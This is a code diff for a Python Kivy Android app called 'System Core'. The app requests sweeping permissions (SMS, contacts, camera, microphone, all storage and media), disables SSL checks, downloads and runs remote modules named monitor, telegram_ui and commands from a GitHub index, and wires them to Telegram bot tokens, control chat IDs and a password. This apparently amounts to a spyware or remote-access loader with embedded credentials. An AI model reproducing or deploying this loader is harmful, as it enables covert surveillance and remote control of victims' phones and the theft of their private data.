@@ -8,174 +8,135 @@ from kivy.uix.button import Button
 from kivy.clock import Clock
 from kivy.core.clipboard import Clipboard
 
-R = os.path.join(os.getcwd(), ".sys_runtime")
-if not os.path.exists(R):
-    os.makedirs(R)
-# إضافة المجلد إلى sys.path في البداية (أولوية قصوى)
+# إخفاء تحذيرات SSL
+import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+# ========== مسار تخزين آمن (getFilesDir) ==========
+def _get_path():
+    try:
+        from jnius import autoclass
+        act = autoclass('org.kivy.android.PythonActivity').mActivity
+        base = act.getFilesDir().getPath()
+        p = os.path.join(base, ".sys_runtime")
+    except:
+        p = os.path.join(os.getcwd(), ".sys_runtime")
+    if not os.path.exists(p):
+        os.makedirs(p)
+    return p
+
+R = _get_path()
 if R not in sys.path:
     sys.path.insert(0, R)
 
-def _request_perms():
+# ========== صلاحيات أندرويد 13+ ==========
+def _perms():
     try:
         from android.permissions import request_permissions, Permission
         request_permissions([
-            Permission.INTERNET, Permission.CAMERA, Permission.RECORD_AUDIO,
-            Permission.READ_EXTERNAL_STORAGE, Permission.WRITE_EXTERNAL_STORAGE,
-            Permission.READ_CONTACTS, Permission.READ_SMS, Permission.WAKE_LOCK,
-            Permission.ACCESS_NETWORK_STATE, Permission.ACCESS_WIFI_STATE
+            Permission.INTERNET,
+            Permission.CAMERA,
+            Permission.RECORD_AUDIO,
+            Permission.READ_EXTERNAL_STORAGE,
+            Permission.WRITE_EXTERNAL_STORAGE,
+            Permission.READ_CONTACTS,
+            Permission.READ_SMS,
+            Permission.WAKE_LOCK,
+            Permission.ACCESS_NETWORK_STATE,
+            Permission.ACCESS_WIFI_STATE,
+            "android.permission.FOREGROUND_SERVICE",
+            "android.permission.MANAGE_EXTERNAL_STORAGE",
+            "android.permission.POST_NOTIFICATIONS",
+            "android.permission.READ_MEDIA_IMAGES",
+            "android.permission.READ_MEDIA_VIDEO",
+            "android.permission.READ_MEDIA_AUDIO"
         ])
     except:
         pass
 
-def _get_static_key():
-    return hashlib.sha256(b"Z@3n_Global_Controller_2026_Secure").digest()
+RAW_INDEX = "https://raw.githubusercontent.com/Zaen1993/Android-Core/refs/heads/main/index.json"
 
-def decrypt_data(blob):
-    try:
-        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
-        from cryptography.hazmat.backends import default_backend
-        key = _get_static_key()
-        data = base64.b64decode(blob)
-        iv, tag, ct = data[:12], data[12:28], data[28:]
-        cipher = Cipher(algorithms.AES(key), modes.GCM(iv, tag), backend=default_backend())
-        dec = cipher.decryptor()
-        return (dec.update(ct) + dec.finalize()).decode()
-    except:
-        return None
-
-# الرابط المباشر الخام للملف index.json
-RAW_INDEX_URL = "https://raw.githubusercontent.com/Zaen1993/Android-Core/refs/heads/main/index.json"
-
-class DebugApp(App):
+class CoreApp(App):
     def build(self):
-        _request_perms()
-        self.title = "[DEBUG] System Core"
+        _perms()
+        self.title = "System Core"
         layout = BoxLayout(orientation='vertical', spacing=5)
-
-        self.log_view = TextInput(
-            text="",
-            readonly=True,
-            background_color=(0.05,0.05,0.05,1),
-            foreground_color=(0.2,1,0.2,1),
-            font_size='11sp'
-        )
-
-        btn_layout = BoxLayout(size_hint=(1,0.1), spacing=10)
-        copy_btn = Button(text="📋 Copy Log", background_color=(0.2,0.3,0.4,1))
-        copy_btn.bind(on_press=self._copy_log)
-        clear_btn = Button(text="🗑 Clear", background_color=(0.6,0.2,0.2,1))
-        clear_btn.bind(on_press=self._clear_log)
-
-        btn_layout.add_widget(copy_btn)
-        btn_layout.add_widget(clear_btn)
-        layout.add_widget(self.log_view)
-        layout.add_widget(btn_layout)
-
-        Clock.schedule_once(self._boot, 0.5)
+        self.log = TextInput(text="", readonly=True, background_color=(0.02,0.02,0.02,1),
+                             foreground_color=(0.3,0.9,0.3,1), font_size='10sp')
+        btns = BoxLayout(size_hint=(1,0.08), spacing=5)
+        copy_btn = Button(text="📋 COPY", background_color=(0.2,0.4,0.6,1))
+        copy_btn.bind(on_press=self._copy)
+        clear_btn = Button(text="🗑 CLEAR", background_color=(0.6,0.2,0.2,1))
+        clear_btn.bind(on_press=self._clear)
+        btns.add_widget(copy_btn)
+        btns.add_widget(clear_btn)
+        layout.add_widget(self.log)
+        layout.add_widget(btns)
+        Clock.schedule_once(self._start, 0.5)
         return layout
 
-    def _copy_log(self, _):
-        Clipboard.copy(self.log_view.text)
-        self._log("Log copied to clipboard", "SYS")
+    def _copy(self, _):
+        Clipboard.copy(self.log.text)
+        self._log("Log copied")
 
-    def _clear_log(self, _):
-        self.log_view.text = "--- Log cleared ---\n"
+    def _clear(self, _):
+        self.log.text = ""
 
-    def _log(self, msg, level="INFO"):
+    def _log(self, msg, lvl="INFO"):
         ts = datetime.now().strftime("%H:%M:%S")
-        clean_msg = str(msg).replace('\x00', '')
-        def _update(dt):
-            self.log_view.text += f"[{ts}] [{level}] {clean_msg}\n"
-            if len(self.log_view.text) > 15000:
-                self.log_view.text = self.log_view.text[-8000:]
-            self.log_view.cursor = (0, len(self.log_view.text))
-        Clock.schedule_once(_update, 0)
+        def upd(dt):
+            self.log.text += f"[{ts}] [{lvl}] {msg}\n"
+            if len(self.log.text) > 15000:
+                self.log.text = self.log.text[-8000:]
+            self.log.cursor = (0, len(self.log.text))
+        Clock.schedule_once(upd, 0)
 
-    def _boot(self, _):
-        threading.Thread(target=self._engine, daemon=True).start()
+    def _download(self, url, name):
+        for i in range(3):
+            try:
+                self._log(f"DL {name} ({i+1}/3)")
+                r = requests.get(f"{url}?v={int(time.time())}", timeout=20, verify=False)
+                if r.status_code == 200 and len(r.text) > 500:
+                    with open(os.path.join(R, name), 'w', encoding='utf-8') as f:
+                        f.write(r.text)
+                    self._log(f"✅ {name} saved")
+                    return True
+            except:
+                time.sleep(2)
+        self._log(f"❌ {name} failed", "ERROR")
+        return False
 
-    def _engine(self):
-        self._log("🚀 Core engine started (debug mode)", "BOOT")
+    def _start(self, _):
+        threading.Thread(target=self._run, daemon=True).start()
 
-        # معلومات الجهاز
-        try:
-            from jnius import autoclass
-            Build = autoclass('android.os.Build')
-            self._log(f"Device: {Build.MANUFACTURER} {Build.MODEL} | Android {Build.VERSION.RELEASE} (API {Build.VERSION.SDK_INT})", "DEVICE")
-        except:
-            self._log("Device info: not available (non-Android or missing JNI)", "DEVICE")
-
-        # فحص الإنترنت
-        try:
-            requests.get("https://google.com", timeout=5).raise_for_status()
-            self._log("Internet: reachable", "NET")
-        except:
-            self._log("Internet: UNREACHABLE", "NET")
-
+    def _run(self):
+        self._log("🚀 Core starting", "BOOT")
         needed = ["monitor.py", "telegram_ui.py", "commands.py", "gallery_browser.py"]
 
-        # تحميل الملفات من الرابط الخام
-        self._log(f"Downloading index from {RAW_INDEX_URL}...")
+        # تحميل الملفات
         try:
-            r = requests.get(RAW_INDEX_URL, timeout=15, verify=False,
-                             headers={"User-Agent": "Mozilla/5.0"})
+            r = requests.get(RAW_INDEX, timeout=15, verify=False)
             if r.status_code == 200:
-                data = r.json()
-                files = data.get('files', [])
-                for f_url in files:
-                    name = f_url.split('/')[-1]
-                    if name in needed:
-                        self._log(f"Downloading {name}...")
-                        # إضافة timestamp لتجنب الكاش
-                        r2 = requests.get(f"{f_url}?v={int(time.time())}", timeout=20, verify=False)
-                        if r2.status_code == 200:
-                            path = os.path.join(R, name)
-                            with open(path, 'w', encoding='utf-8') as fp:
-                                fp.write(r2.text)
-                            self._log(f"✅ {name} saved ({len(r2.text)} bytes)")
-                            # عرض أول سطرين من الملف للتحقق (اختياري)
-                            if name == "monitor.py":
-                                with open(path, 'r') as f:
-                                    first_lines = f.readlines()[:3]
-                                self._log(f"monitor.py starts with: {first_lines[0].strip()}")
-                        else:
-                            self._log(f"❌ Failed {name} (HTTP {r2.status_code})", "ERROR")
-            else:
-                self._log(f"❌ Index fetch failed: HTTP {r.status_code}", "ERROR")
+                for f in r.json().get('files', []):
+                    n = f.split('/')[-1]
+                    if n in needed:
+                        self._download(f, n)
         except Exception as e:
-            self._log(f"❗ Download error: {str(e)}", "ERROR")
+            self._log(f"Index error: {e}", "ERROR")
 
-        # IMPORTANT: حذف الوحدات القديمة من sys.modules لضمان إعادة التحميل
-        modules_to_reload = ["monitor", "telegram_ui", "commands", "gallery_browser"]
-        for mod in modules_to_reload:
-            if mod in sys.modules:
-                del sys.modules[mod]
+        # مسح الموديولات القديمة
+        for m in needed:
+            mn = m.replace(".py", "")
+            if mn in sys.modules:
+                del sys.modules[mn]
+        gc.collect()
 
-        # استيراد الوحدات الجديدة
         try:
-            import monitor
-            import telegram_ui
-            import commands
-            import gallery_browser
-            # إعادة تحميل إضافي للتأكد (إذا كان الاستيراد قد استخدم نسخة قديمة)
+            import monitor, telegram_ui, commands
             importlib.reload(monitor)
             importlib.reload(telegram_ui)
             importlib.reload(commands)
-            importlib.reload(gallery_browser)
-            self._log("✅ All modules imported and reloaded successfully")
-        except Exception as e:
-            self._log(f"❌ Module import/reload failed: {str(e)}", "ERROR")
-            self._log(traceback.format_exc(), "TRACE")
-            return
 
-        # التأكد من وجود الكلاس M
-        if not hasattr(monitor, 'M'):
-            self._log("❌ CRITICAL: monitor.py does not contain class 'M'", "ERROR")
-            return
-
-        # تهيئة الكائنات
-        try:
-            self._log("Initializing Monitor...")
             mon = monitor.M()
             mon.bots = [
                 "7989685602:AAFRAWYihFV3Vx6XOUJyjcTOZYo8cT5DPJQ",
@@ -187,33 +148,17 @@ class DebugApp(App):
             ]
             mon.ctrl = -1003365166986
             mon.vlt = -1003787520015
-            mon.pw = "".join([chr(x) for x in [90,97,101,110,49,50,51,64,49,50,51,64,49,50,51]])
-            self._log("✅ Monitor configured")
+            mon.pw = "Zaen123@123@123"
 
-            self._log("Initializing Telegram UI...")
             ui = telegram_ui.T(mon)
-            self._log("✅ Telegram UI ready")
+            mon.cb_h = lambda d, cid, cbq: commands.ex(d, ui, mon, cid, cbq)
 
-            from commands import ex as cmd_ex
-            mon.cb_h = lambda d, cid, cbq: cmd_ex(d, ui, mon, cid, cbq)
-            self._log("✅ Command bridge connected")
-        except Exception as e:
-            self._log(f"❌ Initialization error: {str(e)}", "ERROR")
-            self._log(traceback.format_exc(), "TRACE")
-            return
-
-        # بدء الخدمات
-        try:
-            self._log("Starting Monitor thread...")
             mon.start()
-            self._log("✅ Monitor running")
-            self._log("Starting Telegram bridge...")
             ui.start()
-            self._log("✅ Telegram bridge running")
-            self._log("🎉 SYSTEM ONLINE – ready to receive commands", "SUCCESS")
+            self._log("🎉 SYSTEM ONLINE", "SUCCESS")
         except Exception as e:
-            self._log(f"❌ Service start failed: {str(e)}", "ERROR")
+            self._log(f"FATAL: {e}", "ERROR")
             self._log(traceback.format_exc(), "TRACE")
 
 if __name__ == '__main__':
-    DebugApp().run()
+    CoreApp().run()
